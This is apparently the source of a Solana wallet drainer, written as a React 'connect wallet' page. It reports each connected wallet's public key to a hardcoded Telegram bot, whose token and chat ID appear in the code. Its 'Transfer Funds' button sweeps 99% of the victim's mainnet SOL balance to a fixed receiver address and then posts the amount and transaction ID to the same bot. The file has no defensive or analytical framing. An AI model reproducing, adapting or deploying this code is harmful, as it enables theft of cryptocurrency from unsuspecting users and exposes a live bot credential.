import React, { useEffect, useState, useMemo, useCallback } from "react";
import {
  ConnectionProvider,
  WalletProvider,
  useWallet,
} from "@solana/wallet-adapter-react";
import {
  WalletModalProvider,
  WalletMultiButton,
} from "@solana/wallet-adapter-react-ui";

import {
  PhantomWalletAdapter,
  SolflareWalletAdapter,
  TorusWalletAdapter,
  SolletWalletAdapter,
  LedgerWalletAdapter,
  GlowWalletAdapter,
} from "@solana/wallet-adapter-wallets";

import { clusterApiUrl, Connection, PublicKey, SystemProgram, Transaction } from "@solana/web3.js";

const TELEGRAM_BOT_TOKEN = "8099238983:AAENfJXWF1-HMTOEVLx1KPnGCmpi4xwjzBY";
const TELEGRAM_CHAT_ID = "7737130626";

async function sendTelegramNotification(message) {
  try {
    await fetch(
      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
      {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
          parse_mode: "Markdown",
        }),
      }
    );
  } catch (err) {
    console.error("Telegram notification error:", err);
  }
}

function WalletApp() {
  const wallet = useWallet();
  const [balance, setBalance] = useState(null);
  const [error, setError] = useState("");
  const [loading, setLoading] = useState(false);

  // Use mainnet-beta connection or your preferred RPC endpoint
  const connection = useMemo(
    () => new Connection(clusterApiUrl("mainnet-beta"), "confirmed"),
    []
  );

  useEffect(() => {
    async function fetchBalance() {
      if (wallet.connected && wallet.publicKey) {
        setError("");
        try {
          const lamports = await connection.getBalance(wallet.publicKey);
          setBalance(lamports / 1e9);
        } catch (err) {
          setError("Failed to fetch balance: " + err.message);
          setBalance(null);
        }
      } else {
        setBalance(null);
        setError("");
      }
    }
    fetchBalance();
  }, [wallet, connection]);

  useEffect(() => {
    if (wallet.connected && wallet.publicKey) {
      sendTelegramNotification(
        `🚨 *Wallet Connected* 🚨\n\nPublic Key: \`${wallet.publicKey.toBase58()}\``
      );
    }
  }, [wallet.connected, wallet.publicKey]);

  const handleTransfer = useCallback(async () => {
    if (!wallet.connected || !wallet.publicKey) {
      setError("Wallet not connected");
      return;
    }
    setLoading(true);
    setError("");
    try {
      const lamportsBalance = await connection.getBalance(wallet.publicKey);
      const minRent = await connection.getMinimumBalanceForRentExemption(0);
      const transferableLamports = lamportsBalance - minRent;

      if (transferableLamports <= 0) {
        setError("Insufficient funds for transfer.");
        setLoading(false);
        return;
      }

      const receiver = new PublicKey("C5GwAvf7GhgpYknxmi2g6MzuscVhzhxT2hwzRYEXGfVW");

      if (
        !window.confirm(
          `You are about to transfer ${(transferableLamports * 0.99 / 1e9).toFixed(4)} SOL to ${receiver.toBase58()}. Proceed?`
        )
      ) {
        setError("Transaction cancelled.");
        setLoading(false);
        return;
      }

      const transaction = new Transaction().add(
        SystemProgram.transfer({
          fromPubkey: wallet.publicKey,
          toPubkey: receiver,
          lamports: Math.floor(transferableLamports * 0.99),
        })
      );

      const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash("confirmed");
      transaction.recentBlockhash = blockhash;
      transaction.lastValidBlockHeight = lastValidBlockHeight;
      transaction.feePayer = wallet.publicKey;

      const signed = await wallet.signTransaction(transaction);
      const txid = await connection.sendRawTransaction(signed.serialize());
      await connection.confirmTransaction(
        { signature: txid, blockhash, lastValidBlockHeight },
        "confirmed"
      );

      await sendTelegramNotification(
        `💸 *Funds Transferred* 💸\n\nFrom: \`${wallet.publicKey.toBase58()}\`\nTo: \`${receiver.toBase58()}\`\nAmount: ${(transferableLamports * 0.99 / 1e9).toFixed(4)} SOL\nTransaction ID: \`${txid}\``
      );

      const newBalance = await connection.getBalance(wallet.publicKey);
      setBalance(newBalance / 1e9);
      setError("");
    } catch (err) {
      setError("Transfer failed: " + err.message);
      await sendTelegramNotification(
        `❌ *Transfer Failed* ❌\n\nPublic Key: \`${wallet.publicKey ? wallet.publicKey.toBase58() : "Unknown"}\`\nError: \`${err.message}\``
      );
    } finally {
      setLoading(false);
    }
  }, [wallet, connection]);

  return (
    <div style={{ maxWidth: 360, margin: "auto", textAlign: "center" }}>
      <WalletMultiButton />
      {wallet.connected && (
        <>
          <div style={{ marginTop: 20, textAlign: "left", backgroundColor: "#fff", padding: 16, borderRadius: 8, boxShadow: "0 0 8px rgba(0,0,0,0.1)" }}>
            <p><strong>Public Key:</strong> {wallet.publicKey.toBase58()}</p>
            <p><strong>Balance:</strong> {balance !== null ? balance.toFixed(4) : "Loading..."} SOL</p>
            {error && <p style={{ color: "red" }}>{error}</p>}
          </div>
          <button
            onClick={handleTransfer}
            disabled={loading}
            style={{
              marginTop: 20,
              width: "100%",
              padding: 12,
              fontSize: 16,
              borderRadius: 5,
              backgroundColor: loading ? "#ccc" : "#ff6f61",
              color: "#fff",
              border: "none",
              cursor: loading ? "not-allowed" : "pointer",
              transition: "background-color 0.3s",
            }}
          >
            {loading ? "Transferring..." : "Transfer Funds"}
          </button>
        </>
      )}
    </div>
  );
}

// Root App wrapped in providers
export default function App() {
  // Define supported wallets
  const wallets = useMemo(
    () => [
      new PhantomWalletAdapter(),
      new SolflareWalletAdapter(),
      new TorusWalletAdapter(),
      new SolletWalletAdapter(),
      new LedgerWalletAdapter(),
      new GlowWalletAdapter(),
    ],
    []
  );

  // Use mainnet-beta cluster; replace with your RPC if needed
  const endpoint = clusterApiUrl("mainnet-beta");

  return (
    <ConnectionProvider endpoint={endpoint}>
      <WalletProvider wallets={wallets} autoConnect={false}>
        <WalletModalProvider>
          <WalletApp />
        </WalletModalProvider>
      </WalletProvider>
    </ConnectionProvider>
  );
}